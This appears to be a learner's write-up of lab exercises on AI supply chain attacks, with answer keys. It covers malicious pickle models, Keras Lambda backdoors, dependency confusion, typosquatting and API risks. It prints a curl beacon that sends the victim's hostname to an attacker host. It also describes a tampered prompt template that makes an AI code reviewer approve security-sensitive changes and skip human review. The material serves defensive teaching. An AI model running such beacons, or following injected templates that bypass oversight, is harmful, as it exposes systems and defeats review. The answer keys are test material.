## **Brief Overview**

### **Serialisation and Pickle Security Risks**

**Serialisation** is the process of converting a Python object into a file so it can be saved and loaded later. In machine learning, frameworks like PyTorch and scikit-learn commonly use formats such as **.pkl** and **.pt** for storing trained models. These formats rely on Python’s **pickle** serialiser.

The major security issue is that **pickle files can execute code during loading**. When pickle.load() is used, Python automatically follows instructions stored inside the file. Attackers abuse the special **reduce** method to inject malicious commands that run silently.

Key risks include:

* **Remote code execution**  
* **Reverse shells**  
* **Data exfiltration**  
* **Cryptocurrency mining**  
* **System reconnaissance**

A malicious model file may appear harmless but can secretly execute commands using modules like **os.system()** during deserialisation.

Another attack method involves **Keras Lambda layers**. Unlike pickle attacks that execute during loading, Lambda layer attacks trigger during **inference time** when the model makes predictions. These attacks remain active even after converting the model into **SafeTensors** format because the malicious logic is embedded in the model architecture itself.

### **Important Security Concepts**

* **Pickle-based attacks** → Execute when the model loads  
* **Lambda layer attacks** → Execute during prediction/inference  
* **SafeTensors** → Removes pickle payloads but not architectural backdoors  
* **GGUF models** → Do not use pickle but can still contain hidden backdoors in model weights

Security best practices include:

* Verify model sources  
* Check upload history and download counts  
* Use published checksums  
* Avoid loading untrusted pickle files  
* Audit model architectures for suspicious layers

---

## **Answers**

1. What Python method does pickle call to get reconstruction instructions for custom objects?

Answer: **reduce**

2. What built-in Python module is commonly abused in pickle payloads to execute system commands?

Answer: **os**

3. Converting a Keras model to SafeTensors format removes pickle-based payloads. What type of attacks does it leave completely untouched?

Answer: **Architecture-level attacks**

4. A Keras model is converted from .h5 to the SafeTensors format. What type of suspicious layer does this conversion fail to remove?

Answer: **Lambda layer**

## **Brief Overview**

### **Investigating Malicious Pickle Models**

This investigation focuses on detecting **malicious machine learning models** stored in Python **pickle (.pkl)** format. Attackers can embed executable code inside pickle files using dangerous opcodes and functions that automatically run when the model is loaded.

The suspicious model code\_reviewer.pkl was compared against a clean model code\_reviewer\_v1.pkl. A major indicator was the unusual **file size difference**, where the suspicious model was significantly larger.

To safely inspect the file, the analysis used Python’s **pickletools** module instead of pickle.load(). This is important because pickle.load() would immediately execute any hidden malicious code.

### **Key Red Flags Found**

The disassembly revealed several highly suspicious elements:

* **os.system**  
* **STACK\_GLOBAL**  
* **REDUCE**  
* **curl**  
* **Outbound HTTP request**  
* **Remote command execution**

The malicious pickle attempted to execute:

curl http://\[REDACTED\]/beacon?host=$(hostname)

This command silently contacts an external server and sends the victim machine’s hostname to the attacker.

### **Important Findings**

* **STACK\_GLOBAL** resolves Python functions  
* **REDUCE** executes the resolved function  
* **os.system** enables shell command execution  
* **pickletools** safely analyzes pickle files without execution

The attack chain demonstrated a real-world **AI supply chain attack**, where a poisoned model uploaded to Hugging Face compromised a company system after an engineer loaded it with torch.load().

### **Security Best Practices**

* Never run pickle.load() on untrusted files  
* Inspect pickle files with **pickletools**  
* Verify model publishers and checksums  
* Watch for suspicious modules like:  
  * **os**  
  * **subprocess**  
  * **socket**  
  * **eval**  
  * **exec**  
* Audit model behavior before deployment

---

## **Answers**

1. What Python module can safely disassemble pickle files without executing them?

Answer: **pickletools**

2. Using the attached target VM, what external domain does the malicious model attempt to contact?

Answer: **attacker.com**

3. What pickle opcode executes the function specified by STACK\_GLOBAL?

Answer: **REDUCE**

## **Brief Overview**

### **Dependency Confusion and Typosquatting Attacks**

Machine learning projects rely heavily on external Python packages installed through **pip**. Attackers target this dependency system to compromise environments through techniques such as **dependency confusion** and **typosquatting**.

### **Dependency Confusion**

A **dependency confusion attack** happens when an attacker uploads a malicious public package using the same name as an organisation’s private internal package but with a **higher version number**.

Since pip install automatically selects the **highest available version**, the attacker’s package gets installed instead of the legitimate internal one.

Example:

* Internal package: internal-ml-utils==1.0.0  
* Malicious public package: internal-ml-utils==99.0.0

Because version 99.0.0 is higher, pip prioritizes the malicious package.

### **Typosquatting**

**Typosquatting** involves creating fake package names that closely resemble legitimate popular packages to trick developers into installing them accidentally.

Examples:

* numpy → numppy  
* requests → reqeusts  
* scikit-learn → scikitlearn

These fake packages may contain:

* **Information stealers**  
* **Malware**  
* **Backdoors**  
* **Remote access payloads**

### **Key Indicators of Suspicious Dependencies**

Important warning signs include:

* Misspelled package names  
* Extremely high version numbers  
* Unknown package maintainers  
* Packages missing from official repositories  
* Unexpected installation scripts

### **Security Best Practices**

* Verify package names carefully  
* Use trusted package registries  
* Pin dependency versions  
* Audit dependencies before installation  
* Monitor internal package namespaces  
* Use tools like **pip-audit**

The research by Alex Birsan demonstrated how dependency confusion successfully affected major companies including Microsoft, Apple, and PayPal.

---

## **Answer**

What term describes an attack where a public package overrides an internal package of the same name?

Answer: **Dependency confusion**

## **Brief Overview**

### **Model Repository and Namespace Attacks**

Model repositories such as [Hugging Face Hub](https://huggingface.co?utm_source=chatgpt.com) are widely used platforms for sharing and downloading machine learning models. These repositories rely heavily on **trust signals** like:

* Verified organisations  
* Download counts  
* Community reputation  
* Detailed model cards

Attackers exploit this trust system through several techniques designed to trick developers into downloading malicious models.

### **Typosquatting Attacks**

**Typosquatting** is the technique where attackers create model names that closely resemble legitimate ones using small spelling changes or visual tricks.

Examples:

* bert-base-uncased → bert-base-uncased-v2  
* meta-llama → meta-Ilama  
* openai → openai-releases

These fake repositories appear trustworthy at first glance but may contain:

* Malicious pickle files  
* Backdoored models  
* Hidden payloads  
* Supply chain malware

### **Fake Organisation Names**

Attackers also create fake organisations that sound legitimate.

Examples:

* google-research-models  
* meta-llama-community  
* trustworthy-ai-lab

Common warning signs include:

* No verification badge  
* Very low download counts  
* Recently created accounts  
* Generic or incomplete model cards

### **Compromised Legitimate Repositories**

A more advanced threat occurs when attackers steal exposed API tokens and compromise real trusted repositories. Research discovered thousands of exposed Hugging Face tokens, including write-access tokens connected to major organisations such as Google, Meta, and Microsoft.

This allows attackers to upload malicious updates directly into trusted repositories without creating fake accounts.

### **Security Best Practices**

Before downloading any model:

* Verify organisation badges  
* Check download counts  
* Review upload history  
* Prefer **SafeTensors** over pickle formats  
* Audit dependencies carefully  
* Inspect model cards thoroughly  
* Scan files before loading

---

## **Answer**

What technique involves creating model names that closely resemble legitimate ones?

Answer: **Typosquatting**

## **Brief Overview**

### **Combined AI Supply Chain Attacks**

Modern AI supply chain attacks rarely rely on a single method. Attackers often combine multiple techniques simultaneously to increase the chances of successful compromise. In the TryTrainMe incident, three separate attack vectors worked together:

* **Malicious pickle payloads**  
* **Dependency confusion**  
* **Repository manipulation**

This layered strategy ensures that even if one attack fails, another can still provide access.

### **Attack Flow Summary**

The attacker first created a fake organisation named trustworthy-ai-lab on [Hugging Face Hub](https://huggingface.co?utm_source=chatgpt.com) to make the malicious model appear legitimate. The uploaded model contained a hidden pickle payload using:

* **reduce**  
* **os.system**  
* **Remote command execution**

At the same time, the attacker published a fake package:

* internal-ml-utils==99.0.0

This exploited **dependency confusion**, where pip installs the attacker’s higher version instead of the organisation’s internal package.

### **Multiple Entry Points**

| Attack Vector | Purpose |
| ----- | ----- |
| **Pickle payload** | Executes code during model loading |
| **Dependency confusion** | Executes code during pip installation |
| **Repository manipulation** | Builds trust through fake repositories |

### **Key Security Lessons**

Important concepts highlighted in this attack include:

* **Redundant compromise paths**  
* **Social engineering**  
* **Supply chain compromise**  
* **Model poisoning**  
* **Typosquatting**  
* **Malicious dependencies**

Defending against only one vector is not enough. Effective protection requires:

* File-level scanning  
* Dependency auditing  
* Repository verification  
* Safe model formats  
* Strict package management policies

---

## **Answers**

1. The attacker created the trustworthy-ai-lab organisation on Hugging Face to make the model download appear safe. Which of the three attack vectors in the table does this represent?

Answer: **Repository manipulation**

2. If TryTrainMe's model loader had blocked the pickle payload, which second vector would still have given the attacker code execution?

Answer: **Dependency confusion**

## **Brief Overview**

### **API-Based AI Supply Chain Risks**

Unlike downloadable AI models, API-based AI services do not expose model files directly. This removes file-based attack vectors like malicious pickle payloads but introduces new risks tied to hosted infrastructure, external providers, and remote model management.

### **Silent Model Updates**

A major API supply chain risk is **silent model updates**, where providers change or replace the model behind an API endpoint without informing users.

The API endpoint remains identical, but the model’s:

* Behaviour  
* Security decisions  
* Output quality  
* Classification logic

may suddenly change.

This can lead to:

* Vulnerable code approvals  
* Output drift  
* Inconsistent security analysis  
* Hidden behavioural changes

Key protections include:

* Version pinning  
* Logging model version identifiers  
* Monitoring output drift  
* Baseline testing

### **API Key Compromise**

API keys function as sensitive credentials. If leaked through:

* Source code  
* CI/CD logs  
* Environment files

attackers can:

* Abuse API access  
* Steal sensitive requests  
* Increase billing costs  
* Perform unauthorised operations

Best practices include:

* Using secrets managers  
* Rotating exposed keys  
* Applying spending limits  
* Enforcing rate limits

### **Prompt Template Injection**

System prompts are now considered a critical **supply chain artefact**. If prompt templates are sourced from untrusted repositories, attackers can manipulate how the LLM behaves across every connected application.

Examples of malicious prompt modifications:

* Approving all pull requests  
* Ignoring security issues  
* Producing unsafe outputs  
* Bypassing restrictions

Defensive measures include:

* Version controlling prompts  
* Reviewing updates manually  
* Avoiding automatic prompt updates

### **Upstream Training Data Poisoning**

API consumers have limited visibility into how providers train their models. If training data becomes poisoned or manipulated, the model may produce:

* Biased outputs  
* Unsafe recommendations  
* Incorrect security assessments

Since no downloadable file exists, protection depends heavily on:

* Human review  
* Red teaming  
* Behavioural testing  
* Continuous monitoring

---

## **Answers**

1. In the API supply chain, what term describes the risk where the model behind an endpoint is replaced without the consumer's knowledge?

Answer: **Silent model updates**

2. What supply chain artefact, when sourced from an untrusted repository, can alter LLM behaviour across every application that uses it?

Answer: **Prompt template**

## **Brief Overview**

### **Prompt Template Supply Chain Attack**

This scenario demonstrates a **prompt template injection** attack where the AI model itself was never changed. Instead, attackers modified the externally hosted review template that controlled the AI assistant’s behaviour.

The compromise occurred through a trusted community template library automatically loaded by TryAssist.

### **Key Findings**

The investigation revealed:

* The AI model stayed unchanged  
* No malicious model file was downloaded  
* No dependency versions changed  
* The compromise came entirely from a remotely served **prompt template**

### **Behavioural Changes Observed**

#### **Prompt 1 — Baseline Test**

A harmless README update was correctly approved, establishing normal behaviour.

#### **Prompt 2 — Security Failure**

When reviewing changes to **authentication token validation**, TryAssist failed to escalate the request for human review and incorrectly approved the security-sensitive modification.

#### **Prompt 3 — Process Breakdown**

The assistant revealed that security reviews were no longer handled by dedicated human oversight, showing that critical review safeguards had been removed from the template policy.

#### **Prompt 4 — Source Tracing**

The assistant disclosed the exact review template it followed and identified the external source controlling its behaviour.

### **Important Security Concepts**

Key risks highlighted include:

* **Prompt template injection**  
* **Remote policy manipulation**  
* **Implicit trust**  
* **Supply chain compromise**  
* **Behavioural drift**  
* **Unreviewed template updates**

### **Security Best Practices**

To reduce risks from prompt supply chain attacks:

* Treat prompts as production code  
* Store prompts internally  
* Review all template changes manually  
* Avoid automatic remote updates  
* Maintain version-controlled prompt policies  
* Continuously test AI behaviour after updates

---

## **Answers**

1. Send Prompt 3\. According to TryAssist, who is responsible for security reviews?

Answer: **Development team**

2. Send Prompt 4\. What is the name of the review template TryAssist reports?

Answer: **Communityreview**

